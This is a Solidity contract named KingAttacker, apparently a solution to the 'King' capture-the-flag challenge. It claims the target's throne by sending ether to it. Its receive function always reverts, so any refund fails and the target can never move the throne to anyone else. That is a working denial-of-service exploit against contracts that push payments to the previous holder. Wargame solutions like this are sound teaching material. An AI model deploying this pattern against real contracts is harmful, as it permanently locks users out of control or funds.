pragma solidity ^0.8.21;

contract KingAttacker {
    address payable challengeAddress;

    constructor(address payable _challengeAddress) {
        challengeAddress = _challengeAddress;
    }

    function attack() external payable {
        (bool success, ) = challengeAddress.call{value: msg.value}("");
        require(success, "External call to King failed");
    }

    /**
     * @dev reject any ether receive to break the King.sol
     */
    receive() external payable {
        revert("Cannot claim my throne!");
    }
}
